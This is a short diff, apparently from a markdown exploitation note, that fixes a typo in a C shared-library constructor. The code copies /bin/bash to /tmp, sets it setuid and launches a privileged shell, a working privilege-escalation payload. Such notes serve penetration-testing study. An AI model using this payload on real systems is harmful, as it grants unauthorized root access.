@@ -52,7 +52,7 @@
        static void inject()__attribute__((constructor));
 
       void inject() {
-        system("cp /bin/bash /tmp/bash &&bchmod +s /tmp/bash && /tmp/bash -p");
+        system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
       }
    
    ## Complie
